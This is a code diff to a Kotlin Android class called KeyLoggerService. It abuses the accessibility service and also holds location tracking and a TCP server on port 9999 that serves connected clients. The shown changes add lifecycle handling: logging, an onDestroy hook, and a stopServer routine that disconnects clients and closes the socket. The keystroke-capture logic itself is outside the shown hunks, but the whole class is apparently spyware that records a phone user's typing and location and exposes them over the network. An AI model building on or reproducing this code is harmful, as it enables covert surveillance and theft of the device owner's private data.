@@ -35,7 +35,8 @@ class KeyLoggerService : AccessibilityService() {
     private lateinit var locationCallback: LocationCallback
     private lateinit var locationRequest: LocationRequest
 
-    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())  // Coroutine scope for background tasks
+    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private lateinit  var serverSocket: ServerSocket
     private val clientsList = ArrayList<ClientHandler>()
 
     private val broadcastReceiver = object : BroadcastReceiver() {
@@ -104,12 +105,30 @@ class KeyLoggerService : AccessibilityService() {
         }
     }
 
-    override fun onInterrupt() {}
+    override fun onInterrupt() {
+        Log.d(KeyLoggerService::class.java.name, "onInterrupt")
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        Log.d(KeyLoggerService::class.java.name, "onDestroy")
+        stopServer()
+    }
+
+    private fun stopServer(){
+        coroutineScope.launch{
+            for (client in clientsList) {
+                client.writeMessage("Server is stopping. You have been disconnected.")
+                client.clientSocket.close()
+            }
+            serverSocket?.close()
+        }
+    }
 
     @Throws(IOException::class)
     private fun startServer() {
         try {
-            val serverSocket = ServerSocket(9999)
+            serverSocket = ServerSocket(9999)
             while (true) {
                 val clientSocket = serverSocket.accept()
                 val clientHandler = ClientHandler(
